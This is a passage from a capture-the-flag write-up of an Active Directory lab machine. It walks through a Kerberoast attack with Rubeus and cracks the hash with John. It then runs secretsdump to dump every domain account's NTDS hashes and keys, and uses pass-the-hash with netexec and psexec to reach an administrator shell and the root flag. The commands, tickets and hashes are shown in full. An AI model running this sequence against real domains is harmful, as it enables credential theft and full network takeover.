useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 10/6/2024 2:17:01 AM
primarygroupid        : 513
pwdlastset            : 10/12/2024 1:52:14 PM
usnchanged            : 131178
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i rubeus.exe`:
```
/home/nabla/tools/Ghostpack-CompiledBinaries/Rubeus.exe
/home/nabla/tools/Ghostpack-CompiledBinaries/dotnet v3.5 compiled binaries/Rubeus.exe
/home/nabla/tools/Ghostpack-CompiledBinaries/dotnet v4.5 compiled binaries/Rubeus.exe
/home/nabla/tools/Ghostpack-CompiledBinaries/dotnet v4.7.2 compiled binaries/Rubeus.exe
/home/nabla/tools/Ghostpack-CompiledBinaries/dotnet v4.8.1 compiled binaries/Rubeus.exe
```

`cp /home/nabla/tools/Ghostpack-CompiledBinaries/Rubeus.exe ./`

`upload ./Rubeus.exe`:
```
Info: Uploading /home/nabla/Rubeus.exe to C:\Users\emily\Documents\Rubeus.exe

Data: 595968 bytes of 595968 bytes copied

Info: Upload successful!
```

![Victim: emily](https://custom-icon-badges.demolab.com/badge/Victim-emily-64b5f6?logo=windows11&logoColor=white)

`klist`:
```
Current LogonId is 0:0x787dcf

Cached Tickets: (0)
```

`./Rubeus.exe asktgt /user:EMILY /domain:ADMINISTRATOR.HTB /password:UXLCI5iETUsIBoFVTj8yQFKoHjXmb /outfile:emily_tgt.kirbi`:
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: EB200A2583A88ACE2983EE5CAA520F31
[*] Building AS-REQ (w/ preauth) for: 'ADMINISTRATOR.HTB\EMILY'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFsjCCBa6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEUFETUlOSVNUUkFUT1IuSFRC
oiYwJKADAgECoR0wGxsGa3JidGd0GxFBRE1JTklTVFJBVE9SLkhUQqOCBGkwggRloAMCARKhAwIBAqKC

[...]

gcgwgcWgGzAZoAMCARehEgQQRF29aVy2ZdBOOkeoh9/+D6ETGxFBRE1JTklTVFJBVE9SLkhUQqISMBCg
AwIBAaEJMAcbBUVNSUxZowcDBQBA4QAApREYDzIwMjQxMjI5MDAxNDM4WqYRGA8yMDI0MTIyOTEwMTQz
OFqnERgPMjAyNTAxMDUwMDE0MzhaqBMbEUFETUlOSVNUUkFUT1IuSFRCqSYwJKADAgECoR0wGxsGa3Ji
dGd0GxFBRE1JTklTVFJBVE9SLkhUQg==

[*] Ticket written to emily_tgt.kirbi


  ServiceName              :  krbtgt/ADMINISTRATOR.HTB
  ServiceRealm             :  ADMINISTRATOR.HTB
  UserName                 :  EMILY
  UserRealm                :  ADMINISTRATOR.HTB
  StartTime                :  12/28/2024 4:14:38 PM
  EndTime                  :  12/29/2024 2:14:38 AM
  RenewTill                :  1/4/2025 4:14:38 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  RF29aVy2ZdBOOkeoh9/+Dw==
  ASREP (key)              :  EB200A2583A88ACE2983EE5CAA520F31
```

`./Rubeus.exe asktgs /ticket:emily_tgt.kirbi /service:HTTP/fake_service /dc:10.10.11.42 /outfile:ethan_tgs.kirbi`:
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'HTTP/fake_service'
[*] Using domain controller: 10.10.11.42
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFwDCCBbygAwIBBaEDAgEWooIEwDCCBLxhggS4MIIEtKADAgEFoRMbEUFETUlOSVNUUkFUT1IuSFRC
oh8wHaADAgECoRYwFBsESFRUUBsMZmFrZV9zZXJ2aWNlo4IEdTCCBHGgAwIBF6EDAgEDooIEYwSCBF8o
4KH+xni9Sq7+SqxE5xXMcDXhIAT+k73IYh1OMyjWcwD52TqwUDVoPDgH/emYTLbAvMCKDTZbI0hK++q5

[...]

16CB1DCB0TCBzqArMCmgAwIBEqEiBCDGzzmpUOOmc2YczOKMVlIzsDSPJRPKMuS/BnwHGmP5O6ETGxFB
RE1JTklTVFJBVE9SLkhUQqISMBCgAwIBAaEJMAcbBUVNSUxZowcDBQBAoQAApREYDzIwMjQxMjI5MDAx
NjU5WqYRGA8yMDI0MTIyOTEwMTQzOFqnERgPMjAyNTAxMDUwMDE0MzhaqBMbEUFETUlOSVNUUkFUT1Iu
SFRCqR8wHaADAgECoRYwFBsESFRUUBsMZmFrZV9zZXJ2aWNl

  ServiceName              :  HTTP/fake_service
  ServiceRealm             :  ADMINISTRATOR.HTB
  UserName                 :  EMILY
  UserRealm                :  ADMINISTRATOR.HTB
  StartTime                :  12/28/2024 4:16:59 PM
  EndTime                  :  12/29/2024 2:14:38 AM
  RenewTill                :  1/4/2025 4:14:38 PM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  xs85qVDjpnNmHMzijFZSM7A0jyUTyjLkvwZ8Bxpj+Ts=


[*] Ticket written to ethan_tgs.kirbi
```

`./Rubeus.exe describe /ticket:ethan_tgs.kirbi`:
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Describe Ticket


  ServiceName              :  HTTP/fake_service
  ServiceRealm             :  ADMINISTRATOR.HTB
  UserName                 :  EMILY
  UserRealm                :  ADMINISTRATOR.HTB
  StartTime                :  12/28/2024 4:16:59 PM
  EndTime                  :  12/29/2024 2:14:38 AM
  RenewTill                :  1/4/2025 4:14:38 PM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  xs85qVDjpnNmHMzijFZSM7A0jyUTyjLkvwZ8Bxpj+Ts=
  Kerberoast Hash       :  $krb5tgs$23$*USER$DOMAIN$HTTP/fake_service*$28E0A1FEC678BD4AAEFE4AAC44E715CC$703
5E12004FE93BDC8621D4E3328D67300F9D93AB05035683C3807FDE9984CB6C0BCC08A0D365B23484
AFBEAB92AA949EAAD821E5E01AA2215C3D297B0B1FAE2FF451151FD1B516B6B141B0CE259279D97B

[...]
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./krb5tgs_hash.txt`:
```
$krb5tgs$23$*USER$DOMAIN$HTTP/fake_service*$28E0A1FEC678BD4AAEFE4AAC44E715CC$7035E12004FE93BDC8621D4E3328D67300F9D93AB05035683C3807FDE9984CB6C0BCC08A0D365B23484AFBEAB92AA949EAAD821E5E01AA2215C3D297B0B1FAE2FF451151FD1B516B6B141B0CE259279D97BA2BFFADCFF62AFDED4DD5C70C601F542523FB2FE7C9DEEE9830F02FC5FA6FDD4316E1C0DFFEA6F757187E8C766A524E7531A42C5BF00A16183AA12EDA0832B54E7C3889D6BEBBAFEF175517DA84DAEE3B56685201077D108A2A67435BE4686233FE0F18FCF8FD26279E67E91309C4EAB0B000388D6721D896626E2FB283E26208EF58E0AB71B854952964FB85414CE08181E07297E293CE357F618462822FC9E485BD2B4DAAC200D95CFDB3F53FFAE627AECBA4F649DB9EB101F605A49B59D8150D53754C1AE62152B61B9206744EC480948CB4B5E51391D18667FF2F91B5BFF4DF0965D74C59E2644E75B5734441DB5C073DAD68A48363D026F80CE90B8D5E26BD6DAE00C38E0BD01B72822FD3A2962B459429CA9C6A2134A93BCF834B54CAD21F600477C6D26550C6C727FFD5F25CF6110AC6D56002E1ADE8610D43152A23844F8C469238B614424773DE4F2F25F9E95F35303DAAA521579E6DF22BCAF1D769D7CA4C33D4740883DEE7E47EC7172B77B55ADD15B966A8E3BEF35717B9FAC240466A88F3CD603B0686EF3E7E70603CF757DB55B944E23D020FB4D97C19135770047BBBF70AC703B02385083A155469C9D56D1D508AA939652DD54DE456BDB0CF4D55E126D89032D779EDB4934292885D1E28B67FC5A2186D3E0D0390E7E152A99C6FE09D7110EEABFB27CC6CA9FCDAFF438E2497534BDED806F89EE6F89046795A67DFA959A56C619AADE6CF0B00ACC9E623D70BBC37A0970D340F6D6A0B03FC76C368A7B558C00EF28A51EDA82DD8F9687E1A1EFD9B3A186B1C963B8CB1BEFCC0CD764D8EE055E8DE932B97504EDC1D78F14E72E74C84A67605A65E7E39BB3195E7484212A8EC0236EF019F78FBB373D8CD500A0CD02DBDCED160DF9C11890B7CEDF6420AF9D1F4C768E25A02FA1A19FF1095B9F034734EF88424A0693D884322F5AEC4D08EED1539E812BE271564CBB66928A68EA1E3DAB5313131D1B34FAED6AEC9DDF4888C1A3C8799A14AFFAAAFE41EE03C1578369B0C8660FE61CA339B3A754DAA60EC88B24E2B6B6A07E52A272BB69F6B1B88B46E97D1C75D072FC2FA82103208EEF64FD1961D4AF2A6B5B671BDDB91357E6214B337948EB6F1C2A7FC8221EF2C4F2D4DD8EF0073FC9519C547201A8F08D0FBCBF3F154B8CFCA1B9881E36079FF34F21234D4EDBCA0DE5C5012830FF816C997C4CDBA2A82295DA22CC940DB1AD83B8B5B287278F731EC84BF97C8B7C506B0DE03D6A1329227029637BB4145AA4E84AF0A044984231EA7E8198EB453C589202DB052E6091A53B5C12D8346AAA6BE3BCFF83A0C9F65AB0175F1FC006ED7B12F31FB514C6C6010C2380F4C315F30CBF6CA8DE807EC542C3E590A1FAC7B3E4597963B10C7629E61184FDB61A7993F7C45F5478685DEDBCAD5F28E84DB6C6005CFEDC7296884DF64AE
```

`john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ./krb5tgs_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit🔑      (?)     
1g 0:00:00:00 DONE (2024-12-28 12:25) 100.0g/s 512000p/s 512000c/s 512000C/s Liverpool..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`netexec smb 10.10.11.42 -u 'ethan' -p 'limpbizkit'`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit🔑
```

`impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@10.10.11.42`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::🔑
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:bc4103a138c65bd0c9c68cde4333c155:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:bc4103a138c65bd0c9c68cde4333c155:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:aa2b154de65fee076d590f303b09ec4874f27e2a4ec350be8f4a396830156fe1
administrator.htb\michael:aes128-cts-hmac-sha1-96:3fdb7537897fd871d665a38c4f18d005
administrator.htb\michael:des-cbc-md5:86b0c8cedf75b36b
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:c185551d6d6078172f37df184edb167a30cad1f8cb2fe478de135aa2833a4652
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:58558d818a4a6fd5f4525cbd1251549d
administrator.htb\benjamin:des-cbc-md5:07e649b946d0455d
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

`netexec smb 10.10.11.42 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'`:
```
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\Administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)📌
```

`impacket-psexec 'administrator.htb/Administrator@10.10.11.42' -hashes ':3dc553ce4b9fd20bd016e098d2d2fd2e'`:
```                                  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.42.....
[*] Found writable share ADMIN$
[*] Uploading file FsuiFGQN.exe
[*] Opening SVCManager on 10.10.11.42.....
[*] Creating service qHdA on 10.10.11.42.....
[*] Starting service qHdA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
🐚

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
administrator\administrator
```

`dir C:\Users\Administrator\Desktop`:
```
    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        12/28/2024   1:54 PM             34 root.txt
```

`type C:\Users\Administrator\Desktop\root.txt`:
```
d02c8***************************🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
